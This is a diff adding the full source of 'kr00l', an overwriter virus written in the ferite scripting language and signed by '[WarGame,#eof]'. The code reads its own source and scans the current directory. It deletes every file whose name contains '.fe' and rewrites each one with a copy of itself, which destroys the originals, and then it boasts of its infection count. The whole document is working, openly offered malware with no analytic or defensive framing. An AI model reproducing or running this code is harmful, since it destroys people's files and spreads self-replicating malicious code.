@@ -1,0 +1,30 @@
+// Hi, this is an overwriter virus written in ferite ... its name is kr00l
+// by [WarGame,#eof] ... you can get ferite here: http://www.ferite.org
+
+uses "console","sys","filesystem";
+
+// useful objects
+object folder = new Directory(".");
+string found_file = "";
+string my_code = "";
+number infections = -1; // to avoid counting itself
+
+     // read its code
+     my_code = File.open(Sys.scriptName()).toString();
+
+     // Let's search
+      while((found_file = folder.getEntry()) != "")
+      {
+         // is it a ferite script ?
+	 if((String.index(found_file,".fe")) != -1)
+	 {
+            File.remove(found_file);
+	    File.create(found_file).writeln(my_code);
+	    infections++;
+	 }
+      }
+
+      if(infections > 0)
+      {
+  Console.println("I am kr00l by [WarGame,#eof], [infections:$infections]");
+      }
